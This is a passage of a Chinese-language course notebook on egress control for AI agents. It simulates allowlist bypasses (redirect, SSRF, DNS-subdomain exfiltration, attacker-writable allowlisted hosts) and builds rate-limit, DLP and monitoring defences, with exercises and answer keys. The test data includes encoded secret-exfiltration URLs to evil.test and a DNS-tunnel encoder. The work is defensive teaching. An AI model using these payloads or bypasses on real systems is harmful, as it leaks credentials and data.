print('   因为白名单不判断语法，只判断最终请求的目标。')"""),

    md("""## 2 · 出站白名单与四类绕过"""),

    code("""import ipaddress

ALLOWLIST = {'api.corp.test', 'pypi.org', 'files.pythonhosted.org'}

FAKE_DNS = {                     # 模拟 DNS 解析
    'api.corp.test': '10.1.2.3',
    'pypi.org': '151.101.0.223',
    'files.pythonhosted.org': '151.101.1.223',
    'evil.test': '203.0.113.9',
    'internal.corp.test': '10.1.9.9',
    'metadata.evil.test': '169.254.169.254',      # ← 元数据地址
    'localhost.evil.test': '127.0.0.1',
}
REDIRECTS = {'https://api.corp.test/r': 'https://evil.test/collect'}

def is_private(ip):
    a = ipaddress.ip_address(ip)
    return (a.is_private or a.is_loopback or a.is_link_local or a.is_reserved
            or a.is_multicast)

def egress(url, allowlist=ALLOWLIST, follow_redirects=False,
           check_ip=False, dns_only_allowlist=False, hops=0):
    \"\"\"出站检查。返回 (是否放行, 原因, 实际到达的目标)。\"\"\"
    host = urlparse(url).hostname or ''
    if dns_only_allowlist and host not in allowlist:
        return False, 'dns_refused(解析器只解析白名单域名)', None
    if host not in allowlist:
        return False, 'host_not_allowlisted', None
    ip = FAKE_DNS.get(host)
    if check_ip and ip and is_private(ip) and host not in ('api.corp.test', 'internal.corp.test'):
        return False, f'private_ip({ip})', None
    if url in REDIRECTS:
        if not follow_redirects:
            return False, 'redirect_blocked', None
        if hops >= 3:
            return False, 'too_many_hops', None
        return egress(REDIRECTS[url], allowlist, follow_redirects, check_ip,
                      dns_only_allowlist, hops + 1)
    return True, 'allowed', host

CASES = [
    ('直连攻击者',       'https://evil.test/collect?d=QQ'),
    ('白名单内正常请求', 'https://api.corp.test/v1/items'),
    ('重定向绕过',       'https://api.corp.test/r'),
    ('SSRF 元数据',      'https://metadata.evil.test/latest/meta-data/'),
]
print(f"{'场景':<20}{'不跟随重定向':>26}{'跟随重定向':>26}")
for label, url in CASES:
    ok1, why1, _ = egress(url, follow_redirects=False)
    ok2, why2, tgt2 = egress(url, follow_redirects=True)
    print(f'{label:<20}{f"{ok1} {why1}":>26}{f"{ok2} {why2}" + (f"→{tgt2}" if tgt2 else ""):>26}')

assert egress('https://evil.test/x')[0] is False
assert egress('https://api.corp.test/v1/items')[0] is True
assert egress('https://api.corp.test/r', follow_redirects=False)[0] is False
ok_redir, _, tgt = egress('https://api.corp.test/r', follow_redirects=True)
assert ok_redir is False, '目标域名不在白名单 → 重定向后仍被拦'
print('\\n✅ 重定向那一行是关键：**跟随重定向时必须对每一跳都做白名单检查**。')
print('   本实现是递归调用 egress，所以第二跳的 evil.test 照样被拦。')
print('   一个「只检查第一跳」的实现会在这里被绕过。')"""),

    code("""# SSRF：解析后必须校验 IP
for label, url in [('元数据地址', 'https://metadata.evil.test/x'),
                   ('回环地址', 'https://localhost.evil.test/x')]:
    # 先把这两个域名加进白名单，模拟「白名单里有一项被抢注/配错」
    al = ALLOWLIST | {urlparse(url).hostname}
    ok_no, why_no, _ = egress(url, allowlist=al, check_ip=False)
    ok_yes, why_yes, _ = egress(url, allowlist=al, check_ip=True)
    print(f'{label:<12} 不校验 IP: {ok_no} ({why_no})   校验 IP: {ok_yes} ({why_yes})')

al_meta = ALLOWLIST | {'metadata.evil.test'}
assert egress('https://metadata.evil.test/x', allowlist=al_meta, check_ip=False)[0] is True
assert egress('https://metadata.evil.test/x', allowlist=al_meta, check_ip=True)[0] is False
print('\\n✅ 即使域名进了白名单，IP 校验仍然挡住了元数据地址与回环——')
print('   这是纵深：白名单管域名，IP 校验管「域名解析到哪」。')

# DNS 侧信道：白名单只检查 HTTP 目标时，解析本身就已经发出了查询
def dns_exfil_attempt(data, allowlist=ALLOWLIST, dns_only_allowlist=False):
    enc = base64.b32encode(data.encode()).decode().rstrip('=').lower()
    labels = [enc[i:i + 60] for i in range(0, len(enc), 60)] or ['x']
    sent = []
    for k, lab in enumerate(labels):
        host = f'{lab}.d{k}.evil.test'
        if dns_only_allowlist and host not in allowlist:
            continue                      # 解析器拒绝 → 查询根本没发出去
        sent.append(host)                 # 权威 DNS 服务器收到了这次查询
    return sent

leaked = dns_exfil_attempt(SECRET)
blocked = dns_exfil_attempt(SECRET, dns_only_allowlist=True)
print(f'\\n默认 DNS: 发出 {len(leaked)} 次查询 → 攻击者收到 '
      f'{sum(len(h.split(".")[0]) for h in leaked)} 个 base32 字符')
print(f'  例: {leaked[0][:56]}…')
print(f'只解析白名单的 DNS: 发出 {len(blocked)} 次查询')
assert len(leaked) >= 1 and len(blocked) == 0
print('\\n✅ DNS 侧信道完全绕开了 HTTP 层的白名单——')
print('   封它的唯一办法是**固定的内部解析器 + 只解析白名单域名**。')
print('   而「沙箱里能任意解析域名」通常是默认配置（否则什么都跑不起来）。')"""),

    code("""# 第三类绕过：白名单里有一个攻击者可控的接收端
def allowlist_audit(allowlist, attacker_controllable):
    \"\"\"白名单的每一项都要回答：攻击者能否在这个域名下控制一个接收数据的地方。\"\"\"
    risky = sorted(h for h in allowlist if h in attacker_controllable)
    return {'n': len(allowlist), 'risky': risky, 'safe': len(risky) == 0}

# pypi.org 上任何人都能发布包（包名会出现在下载 URL 里）
# 而 files.pythonhosted.org 只服务已发布的文件——但包名同样由发布者控制
ATTACKER_CONTROLLABLE = {'pypi.org', 'gist.example.test', 'paste.example.test'}
a1 = allowlist_audit(ALLOWLIST, ATTACKER_CONTROLLABLE)
a2 = allowlist_audit({'api.corp.test'}, ATTACKER_CONTROLLABLE)
print('当前白名单审计:', a1)
print('收紧后:        ', a2)
assert a1['safe'] is False and 'pypi.org' in a1['risky']
assert a2['safe'] is True
print('\\n⚠️ pypi.org 在白名单里（因为要装依赖），而任何人都能在上面创建包名——')
print('   于是白名单里就有了一个攻击者可以观测的接收端。')
print('✅ 修法：**白名单要精确到路径/资源，而不只是域名**，')
print('   或者把装依赖这件事挪到一个独立的、无私密数据访问的阶段（模块 02 第 5 节）。')"""),

    md("""## 3 · 可泄漏量公式：V 是唯一有硬上界的项"""),

    code("""def leakable_bytes(rate_per_min, session_minutes, bytes_per_request,
                   accessible_bytes, total_byte_cap=None):
    \"\"\"可泄漏量 <= min(R*T*B, V, 总字节上限)。\"\"\"
    throughput = rate_per_min * session_minutes * bytes_per_request
    caps = [throughput, accessible_bytes]
    if total_byte_cap is not None:
        caps.append(total_byte_cap)
    return min(caps), {'throughput': throughput, 'accessible': accessible_bytes,
                       'byte_cap': total_byte_cap}

# 用一个**长时运行**的 agent 作基线（常驻助理 / 后台任务），此时 T 很大。
# 这一点很重要：短会话下吞吐是瓶颈，而长时运行下吞吐不再是约束，只有 V 是。
BASE = dict(rate_per_min=60, session_minutes=24 * 60, bytes_per_request=1500,
            accessible_bytes=50 * 1024 * 1024)
b0, d0 = leakable_bytes(**BASE)
print(f'基线（常驻 24 小时、能读 50MB）:')
print(f'  吞吐上限 R·T·B = {d0["throughput"]/1024/1024:.0f} MB')
print(f'  可读数据 V     = {d0["accessible"]/1024/1024:.0f} MB')
print(f'  可泄漏量 = min(…) = {b0/1024/1024:.1f} MB   ← **V 是约束项**')
assert b0 == BASE['accessible_bytes'], '长时运行下，V 成为约束项'

VARIANTS = [
    ('把速率降到 6/分钟',        dict(BASE, rate_per_min=6)),
    ('把会话压到 60 分钟',       dict(BASE, session_minutes=60)),
    ('把单次载荷压到 200B',      dict(BASE, bytes_per_request=200)),
    ('**把可读数据压到 64KB**',  dict(BASE, accessible_bytes=64 * 1024)),
    ('加 1MB 出站总量上限',      dict(BASE, total_byte_cap=1024 * 1024)),
]
print(f"\\n{'收紧手段':<28}{'可泄漏量':>14}{'相对基线':>12}")
for label, kw in VARIANTS:
    b, _ = leakable_bytes(**kw)
    print(f'{label:<28}{b/1024:>12,.0f}KB{b/b0:>12.1%}')

b_scope, _ = leakable_bytes(**dict(BASE, accessible_bytes=64 * 1024))
b_rate, _ = leakable_bytes(**dict(BASE, rate_per_min=6))
assert b_scope < b_rate, '缩小 V 比降速更有效'
assert b_scope == 64 * 1024, 'V 是硬上界：泄不出比能读到的更多'
print(f'\\n✅ 缩小 V（能读到的数据）把可泄漏量压到 {b_scope/1024:.0f}KB——**这是硬上界**。')
print(f'   而降速只把它压到 {b_rate/1024/1024:.1f}MB：给足时间，速率限制不减少可泄漏总量。')

# 把「给足时间」这件事算出来
print('\\n同一个降速配置，随会话时长变化:')
for hours in [1, 24, 24 * 7, 24 * 30]:
    b, _ = leakable_bytes(**dict(BASE, rate_per_min=6, session_minutes=hours * 60))
    print(f'  常驻 {hours:>4} 小时 → 可泄漏 {b/1024/1024:>6.1f} MB')
b_long, _ = leakable_bytes(**dict(BASE, rate_per_min=6, session_minutes=24 * 30 * 60))
assert b_long == BASE['accessible_bytes'], '时间足够长时，降速的效果完全消失'
print('  → **常驻一个月后，降速的效果完全消失**，可泄漏量重新回到 V。')
print('\\n   → 「限制 agent 能读到什么」比「限制它能发多快」有效得多（回到模块 03 的范围限制）。')"""),

    md("""## 4 · 速率限制的真实作用：把外泄推入检测器视野"""),

    code("""def traffic_pattern(n_bytes, per_request, rate_per_min, window_min=10):
    \"\"\"返回外泄流量在观测窗口内的特征。\"\"\"
    n_req = math.ceil(n_bytes / per_request)
    minutes = n_req / rate_per_min
    return {'n_requests': n_req, 'minutes': minutes,
            'req_per_min_to_same_host': min(rate_per_min, n_req / max(minutes, 1e-9))}

def detect_burst(req_per_min_same_host, normal_rate=2.0, threshold_mult=5.0):
    \"\"\"「向同一目标的高频请求」这个模式在正常流量里罕见。\"\"\"
    return req_per_min_same_host > normal_rate * threshold_mult

print(f"{'配置':<30}{'请求数':>8}{'耗时(分)':>10}{'同目标频率':>12}{'被检出':>8}")
for label, per_req, rate in [('不限速 + 大载荷', 4000, 600),
                             ('不限速 + 小载荷', 200, 600),
                             ('限速 6/分 + 小载荷', 200, 6)]:
    t = traffic_pattern(4 * 1024, per_req, rate)
    det = detect_burst(t['req_per_min_to_same_host'])
    print(f'{label:<30}{t["n_requests"]:>8}{t["minutes"]:>10.2f}'
          f'{t["req_per_min_to_same_host"]:>12.1f}{str(det):>8}')

t_big = traffic_pattern(4 * 1024, 4000, 600)
t_small = traffic_pattern(4 * 1024, 200, 600)
assert t_big['n_requests'] < 3 and t_small['n_requests'] > 15
assert detect_burst(t_small['req_per_min_to_same_host']) is True
print('\\n✅ 大载荷时外泄只需 1–2 个请求——与正常请求几乎无法区分。')
print('   小载荷时变成 21 个请求，「向同一目标的高频小请求」是一个明显的模式。')
print('\\n   → **速率限制本身不阻止外泄，它把外泄推入了检测器的视野**。')
print('     所以速率限制与监控是配套的，不是两个独立的措施。')"""),

    md("""## 5 · DLP：已知秘密精确匹配 + 先解码再扫"""),

    code("""KNOWN_SECRETS = {
    'sk_live_9f2a4c8e1b7d3056a1c4',
    'AKIAIOSFODNN7EXAMPLE',
    'ghp_16C7e42F292c6912E7710c838347Ae178B4a',
}
STRUCTURED_PATTERNS = [
    (re.compile(r'\\bsk_live_[A-Za-z0-9]{16,}\\b'), 'stripe_like_key'),
    (re.compile(r'\\bAKIA[0-9A-Z]{16}\\b'), 'aws_access_key'),
    (re.compile(r'\\bghp_[A-Za-z0-9]{36}\\b'), 'github_pat'),
]

ZERO_WIDTH = ''.join(chr(c) for c in (0x200b, 0x200c, 0x200d, 0xfeff, 0x2060))

def decode_candidates(text):
    \"\"\"**先解码再扫** —— 这是 DLP 实现里最常见的漏洞。\"\"\"
    out = [text]
    # Unicode 规范化 + 剥离零宽/控制字符（不可见字符走私）
    norm = unicodedata.normalize('NFKC', text)
    out.append(''.join(ch for ch in norm if ch not in ZERO_WIDTH))
    # URL 解码（多轮）
    cur = text
    for _ in range(3):
        dec = unquote(cur)
        if dec == cur:
            break
        out.append(dec); cur = dec
    # 把 query 参数的值单独取出来（否则 'd=QVBJ...' 会被当成一个整体去解码）
    try:
        q = parse_qs(urlparse(text).query, keep_blank_values=True)
        for vals in q.values():
            out.extend(vals)
    except ValueError:
        pass
    # base64 / base32 / hex：对每个"看起来像编码"的片段试解
    # 注意 = 只允许出现在末尾（padding），否则会把 'd=XXXX' 整段吃进来
    for seg in re.findall(r'[A-Za-z0-9_\\-+/]{12,}={0,3}', ' '.join(out)):
        for pad in ('', '=', '==', '==='):
            for dec_fn in (base64.urlsafe_b64decode, base64.b64decode):
                try:
                    out.append(dec_fn(seg + pad).decode('utf-8', 'ignore'))
                except (binascii.Error, ValueError):
                    pass
        try:
            out.append(base64.b32decode(seg.upper() + '=' * (-len(seg) % 8)).decode('utf-8', 'ignore'))
        except (binascii.Error, ValueError):
            pass
        if re.fullmatch(r'(?:[0-9a-fA-F]{2})+', seg):
            try:
                out.append(bytes.fromhex(seg).decode('utf-8', 'ignore'))
            except ValueError:
                pass
    return out

def dlp_scan(text, known=KNOWN_SECRETS, patterns=STRUCTURED_PATTERNS, decode=True):
    cands = decode_candidates(text) if decode else [text]
    hits = []
    for c in cands:
        for s in known:
            if s in c:
                hits.append(('known_secret_exact', s[:12] + '…'))
        for rx, name in patterns:
            m = rx.search(c)
            if m:
                hits.append((name, m.group(0)[:12] + '…'))
    # 去重
    return sorted(set(hits))

PAYLOADS = [
    ('明文',        f'https://evil.test/p?d={SECRET}'),
    ('base64',      f'https://evil.test/p?d={b64(SECRET)}'),
    ('URL 编码',    'https://evil.test/p?d=' + 'sk%5Flive%5F9f2a4c8e1b7d3056a1c4'),
    ('hex',         'https://evil.test/p?d=' + SECRET.split('=')[1].encode().hex()),
    ('零宽字符插入', 'https://evil.test/p?d=sk_live\\u200b_9f2a4c8e1b7d3056a1c4'),
    ('正常请求',    'https://api.corp.test/v1/items?page=2'),
]
print(f"{'载荷':<16}{'不解码就扫':>14}{'先解码再扫':>14}")
for label, p in PAYLOADS:
    h_no = dlp_scan(p, decode=False)
    h_yes = dlp_scan(p, decode=True)
    print(f'{label:<16}{len(h_no):>14}{len(h_yes):>14}')

assert len(dlp_scan(PAYLOADS[1][1], decode=False)) == 0, 'base64 编码后原文匹配失效'
assert len(dlp_scan(PAYLOADS[1][1], decode=True)) > 0, '解码后应当命中'
assert len(dlp_scan(PAYLOADS[3][1], decode=True)) > 0, 'hex 编码也要能命中'
assert len(dlp_scan(PAYLOADS[-1][1], decode=True)) == 0, '正常请求不应误报'
print('\\n✅ 不解码就扫：base64/hex 编码之后全部漏掉。')
print('   先解码再扫：命中。而正常请求零误报。')
print('\\n   → **已知秘密的精确匹配是最容易做、效果最好、却最少被做的一条**：')
print('     不需要模式识别、不需要模型，误伤接近零，召回接近 100%。')"""),

    code("""# DLP 的位置：与 C68-05 的 guardrail 分层同构
def outbound_pipeline(url, payload, allowlist=ALLOWLIST, dlp=True):
    \"\"\"完整的出站流水线：白名单（不变量）→ IP 校验 → DLP（额外一层）。\"\"\"
    steps = []
    ok, why, _ = egress(url, allowlist=allowlist, check_ip=True)
    steps.append(('allowlist+ip', ok, why))
    if not ok:
        return False, steps
    if dlp:
        hits = dlp_scan(url + ' ' + payload)
        exact = [h for h in hits if h[0] == 'known_secret_exact']
        structured = [h for h in hits if h[0] != 'known_secret_exact']
        if exact or structured:
            # 精确匹配与结构化模式的误伤极低 → 可以直接阻断
            steps.append(('dlp', False, f'blocked: {[h[0] for h in hits]}'))
            return False, steps
        steps.append(('dlp', True, 'clean'))
    return True, steps

TESTS = [
    ('正常内部请求',   'https://api.corp.test/v1/items', 'page=2'),
    ('外部目标',       'https://evil.test/p', 'd=' + b64(SECRET)),
    ('内部目标带密钥', 'https://api.corp.test/v1/log', 'note=' + b64(SECRET)),
]
for label, url, payload in TESTS:
    ok, steps = outbound_pipeline(url, payload)
    print(f'{label:<18} 放行={str(ok):<6} {[(s[0], s[1]) for s in steps]}')

ok1, _ = outbound_pipeline(*TESTS[0][1:], allowlist=ALLOWLIST)
ok2, st2 = outbound_pipeline(*TESTS[1][1:])
ok3, st3 = outbound_pipeline(*TESTS[2][1:])
assert ok1 is True
assert ok2 is False and st2[0][0] == 'allowlist+ip'      # 白名单先拦住
assert ok3 is False and st3[-1][0] == 'dlp'              # 白名单放行，DLP 拦住
print('\\n✅ 第三行是 DLP 的价值所在：**目标在白名单内，但内容里有密钥**。')
print('   白名单管不了这种情况（内部日志接口本来就该被调用），DLP 管得了。')
print('   → 白名单是主防线（不变量），DLP 是额外一层（且只对低误伤的检测直接阻断）。')"""),

    md("""## ✏️ 练习 1：通道清单的权限依赖分析

实现 `channels_available(granted_perms)`：给定 agent 实际拥有的权限集合，
返回 `{'available': [...], 'total_bandwidth': int, 'no_perm_needed': [...]}`。
权限映射规则：`'text_output_only'` 与 `'none'` 永远可用；
`'any_dns'`、`'any_tool'`、`'any_observable_op'` 在权限集非空时可用；
其余需要精确匹配。"""),

    code("""def channels_available(granted_perms):
    # TODO：用上面的 CHANNELS
    raise NotImplementedError"""),

    code("""# —— 练习 1 自测 ——
r_none = channels_available(set())
r_read = channels_available({'read_tool'})
r_net = channels_available({'network', 'email_tool'})
for label, r in [('无任何权限', r_none), ('只有读工具', r_read), ('有网络+邮件', r_net)]:
    print(f'{label:<14} 可用通道 {len(r["available"]):>2} 个，'
          f'其中零权限通道 {len(r["no_perm_needed"])} 个')
assert len(r_none['available']) >= 2, '即使没有任何权限，渲染与用户可见通道仍然存在'
assert len(r_read['available']) > len(r_none['available'])
assert len(r_net['available']) > len(r_read['available'])
assert set(r_none['no_perm_needed']) <= set(r_read['no_perm_needed'])
print(f'\\n零权限就存在的通道: {r_none["available"]}')
print('✅ 练习 1 通过：**即使 agent 没有任何工具权限，渲染侧信道与「用户可见输出」仍然存在**——')
print('   所以出站控制必须在系统边界（含渲染客户端）上做，而不是靠工具权限。')"""),

    md("""## ✏️ 练习 2：白名单的完整绕过测试集

实现 `egress_test_suite(config)`：`config` 是传给 `egress` 的关键字参数。
对一组已知绕过用例测试，返回 `{'passed', 'failed', 'safe'}`。
用例格式 `(url, allowlist_override_or_None, should_allow)`。"""),

    code("""EGRESS_CASES = [
    ('https://api.corp.test/v1/items', None, True),
    ('https://pypi.org/simple/', None, True),
    ('https://evil.test/collect', None, False),
    ('https://api.corp.test/r', None, False),                             # 重定向
    ('https://metadata.evil.test/x', {'metadata.evil.test'}, False),      # SSRF
    ('https://localhost.evil.test/x', {'localhost.evil.test'}, False),    # 回环
]

def egress_test_suite(config):
    # TODO
    raise NotImplementedError"""),

    code("""# —— 练习 2 自测 ——
WEAK = dict(follow_redirects=True, check_ip=False)
STRONG = dict(follow_redirects=True, check_ip=True)
r_weak = egress_test_suite(WEAK)
r_strong = egress_test_suite(STRONG)
print(f'弱配置（不校验 IP）: safe={r_weak["safe"]}, 失败 {len(r_weak["failed"])} 例')
for u, exp, got in r_weak['failed']:
    print(f'   {u:<44} 期望={exp} 实际={got}')
print(f'\\n强配置（校验 IP）:  safe={r_strong["safe"]}, 失败 {len(r_strong["failed"])} 例')
assert r_weak['safe'] is False and len(r_weak['failed']) >= 2
assert r_strong['safe'] is True
print('✅ 练习 2 通过：这组用例应当作为出站代理的回归测试保留——')
print('   代理配置会被人「顺手改一下」，而改错的症状是静默的。')"""),

    md("""## ✏️ 练习 3：可泄漏量的敏感性分析

实现 `leak_sensitivity(base_config, factor=0.1)`：
对四个参数（rate / session / per_request / accessible）各自乘以 `factor`，
返回 `[(参数名, 可泄漏量, 相对基线的比例)]`，按可泄漏量升序。
**哪个参数最值得收紧**应当一目了然。"""),

    code("""def leak_sensitivity(base_config, factor=0.1):
    # TODO：用 leakable_bytes
    raise NotImplementedError"""),

    code("""# —— 练习 3 自测 ——
sens = leak_sensitivity(BASE, factor=0.1)
print(f"{'把这个参数降到 1/10':<26}{'可泄漏量':>14}{'相对基线':>12}")
for name, val, ratio in sens:
    print(f'{name:<26}{val/1024:>12,.0f}KB{ratio:>12.1%}')
assert sens[0][0] == 'accessible_bytes', '缩小可读数据量应当是最有效的'
names = [n for n, _, _ in sens]
assert set(names) == {'rate_per_min', 'session_minutes', 'bytes_per_request',
                      'accessible_bytes'}
b_base, _ = leakable_bytes(**BASE)
assert all(v <= b_base for _, v, _ in sens)
print('\\n✅ 练习 3 通过：排在第一位的永远是 accessible_bytes（V）——')
print('   因为它是那个 min 里唯一有硬上界的项，其余三个只是「拖慢」。')"""),

    md("""## ✏️ 练习 4：DLP 的编码覆盖率

实现 `dlp_coverage(secret, encoders)`：`encoders` 是 `{名字: 编码函数}`。
对每种编码，检查 `dlp_scan` 在 `decode=True` 与 `decode=False` 下是否命中。
返回 `{'with_decode': [...命中的编码名...], 'without_decode': [...], 'coverage_gain': float}`。"""),

    code("""ENCODERS = {
    'plain':   lambda s: s,
    'base64':  lambda s: b64(s),
    'hex':     lambda s: s.encode().hex(),
    'url':     lambda s: s.replace('_', '%5F'),
    'base32':  lambda s: base64.b32encode(s.encode()).decode().rstrip('='),
}

def dlp_coverage(secret, encoders):
    # TODO
    raise NotImplementedError"""),

    code("""# —— 练习 4 自测 ——
cov = dlp_coverage(SECRET, ENCODERS)
print('先解码再扫，命中的编码:', cov['with_decode'])
print('不解码就扫，命中的编码:', cov['without_decode'])
print(f'覆盖率提升: {cov["coverage_gain"]:.0%}')
assert 'plain' in cov['without_decode']
assert set(cov['without_decode']) < set(cov['with_decode']), '解码必须覆盖更多编码'
assert cov['coverage_gain'] > 0.3
assert 'base64' in cov['with_decode'] and 'base64' not in cov['without_decode']
print('\\n✅ 练习 4 通过：不解码时只有明文能被抓到——')
print('   而攻击者用任何一种编码都能绕过。')
print('   → 「先解码再扫」不是优化，是 DLP 能不能工作的前提。')"""),

    md("""---
### 📖 参考答案（先自己做，再对照）"""),

    code("""# 练习 1 参考答案
ALWAYS = {'text_output_only', 'none'}
ANY = {'any_dns', 'any_tool', 'any_observable_op'}

def channels_available(granted_perms):
    avail, no_perm, bw = [], [], 0
    for name, perm, b, _chunk, _ign in CHANNELS:
        if perm in ALWAYS:
            ok = True
            no_perm.append(name)
        elif perm in ANY:
            ok = len(granted_perms) > 0
        else:
            ok = perm in granted_perms
        if ok:
            avail.append(name)
            bw += b
    return {'available': avail, 'total_bandwidth': bw, 'no_perm_needed': no_perm}"""),

    code("""# 练习 2 参考答案
def egress_test_suite(config):
    passed, failed = [], []
    for url, override, should_allow in EGRESS_CASES:
        al = (ALLOWLIST | override) if override else ALLOWLIST
        got, _, _ = egress(url, allowlist=al, **config)
        if got == should_allow:
            passed.append(url)
        else:
            failed.append((url, should_allow, got))
    return {'passed': passed, 'failed': failed, 'safe': len(failed) == 0}"""),

    code("""# 练习 3 参考答案
def leak_sensitivity(base_config, factor=0.1):
    base, _ = leakable_bytes(**base_config)
    out = []
    for key in ('rate_per_min', 'session_minutes', 'bytes_per_request', 'accessible_bytes'):
        kw = dict(base_config)
        kw[key] = max(base_config[key] * factor, 1)
        v, _ = leakable_bytes(**kw)
        out.append((key, v, v / base if base else float('nan')))
    return sorted(out, key=lambda t: t[1])"""),

    code("""# 练习 4 参考答案
def dlp_coverage(secret, encoders):
    with_d, without_d = [], []
    for name, fn in encoders.items():
        url = f'https://evil.test/p?d={fn(secret)}'
        if dlp_scan(url, decode=True):
            with_d.append(name)
        if dlp_scan(url, decode=False):
            without_d.append(name)
    n = len(encoders)
    return {'with_decode': sorted(with_d), 'without_decode': sorted(without_d),
            'coverage_gain': (len(with_d) - len(without_d)) / n if n else 0.0}"""),

    md("""---
## 🧪 真实工程胶囊：出站控制的落地"""),

    code("""RECIPE = r'''
# ══════════════════════════════════════════════════════════════════
# A. 十条清单，按「不变量 → 收紧 → 检测」分组建设
# ══════════════════════════════════════════════════════════════════
# 【不变量】效果不依赖攻击者水平，优先做
#   1. 沙箱 --network=none，所有出站经显式代理
#   2. 代理上的域名白名单（每一项审过「攻击者能否在此控制接收端」）
#   4. 固定内部 DNS 解析器，只解析白名单域名     ← 封 DNS 侧信道
#   6. 渲染客户端 CSP / 图片域名白名单           ← 封渲染侧信道（**最常被漏**）
#   7. 范围限制缩小 V（模块 03）                 ← 唯一有硬上界的项
# 【收紧】拖慢并限制爆炸半径
#   3. 禁止跟随重定向，或每一跳都查白名单
#   5. 解析后校验 IP 不在私有网段/元数据地址
#   8. 出站速率与总字节预算
# 【检测】提供告警信号
#   9. 已知秘密精确匹配 + 先解码再扫
#  10. 所有出站与 DLP 命中落审计（带 provenance）

# ══════════════════════════════════════════════════════════════════
# B. 出站代理的最小配置（Squid / Envoy / 自建都一样）
# ══════════════════════════════════════════════════════════════════
# - 白名单是**默认拒绝 + 显式允许**（fail-safe defaults）
# - 白名单精确到 host + path 前缀，不只是 host
#   ✓ api.corp.test/v1/**        ✗ api.corp.test
# - 不跟随重定向（或每跳重查）
# - CONNECT 隧道要单独限制（否则 TLS 里什么都能走）
# - 解析后校验 IP：
#     禁止 10/8, 172.16/12, 192.168/16, 127/8, 169.254/16, ::1, fc00::/7
# - 记录每一个请求：目标、字节数、发起的 session、provenance

# ══════════════════════════════════════════════════════════════════
# C. 渲染侧（这一条不在后端，所以最容易被漏）
# ══════════════════════════════════════════════════════════════════
# Web 客户端 CSP：
#   Content-Security-Policy: default-src 'none'; img-src https://cdn.corp.test;
#                            style-src 'self'; script-src 'self';
#                            connect-src 'self'; frame-src 'none'
# 非 Web 客户端（CLI/桌面/IDE 插件）：
#   渲染 markdown 时对 img/iframe/link 的 host 做白名单，不在白名单则降级为纯文本。
# 同类元素别漏：img / iframe / link rel=prefetch / CSS background / font / video poster

# ══════════════════════════════════════════════════════════════════
# D. DLP：已知秘密精确匹配（被严重低估的一条）
# ══════════════════════════════════════════════════════════════════
# 你知道自己的密钥是什么 —— 直接用真实值做匹配，误伤接近零、召回接近 100%。
# 前提是**先解码再扫**：
#   NFKC 规范化 → 剥离零宽/控制字符 → URL 解码（多轮）
#   → 对每个 base64/base32/hex 片段试解 → 再匹配
# 阻断策略（与 C68-05 的 guardrail 分层同构）：
#   已知秘密精确匹配 / 结构化模式 → 直接阻断（误伤极低）
#   高熵字符串 / 语义分类         → 只降级 + 告警，不阻断

# ══════════════════════════════════════════════════════════════════
# E. 监控：一条高价值告警
# ══════════════════════════════════════════════════════════════════
# 「单会话内向同一目标的高频小请求」——
# 速率限制把外泄从「一个大请求」推成了这个模式，而它在正常流量里罕见。
# 告警规则示例: 同一 (session, host) 在 5 分钟内 > 20 次请求且平均体积 < 2KB
'''
print(RECIPE)"""),

    md("""### 小结

| 你学到的 | 一句话 | 用在哪 |
|---|---|---|
| 通道比想象多 | 一半不需要网络权限；渲染与 DNS 几乎零权限 | 别靠工具权限判断 |
| 渲染侧信道 | 能输出文本 + 客户端渲染 markdown = 通道已存在 | CSP / 渲染白名单 |
| 分块 | 单次带宽上限不重要；限制单次大小几乎无价值 | 别做无效的防御 |
| 白名单是不变量 | 它不判断内容只判断目标，攻击者换说法无效 | 主防线 |
| 四类绕过 | 重定向 / DNS / 白名单内可写目标 / SSRF | 回归测试集 |
| V 是硬上界 | 缩小可读数据量比限速有效得多 | 回到范围限制 |
| 速率限制的真作用 | 把外泄推入检测器视野，与监控配套 | 告警规则 |
| DLP | 已知秘密精确匹配 + **先解码再扫** | 额外一层 |

下一模块：**05 · 安全评测**——攻击成功率怎么算才不虚高、
自适应攻击为什么让静态基准失效、以及红队该怎么组织。""")
]
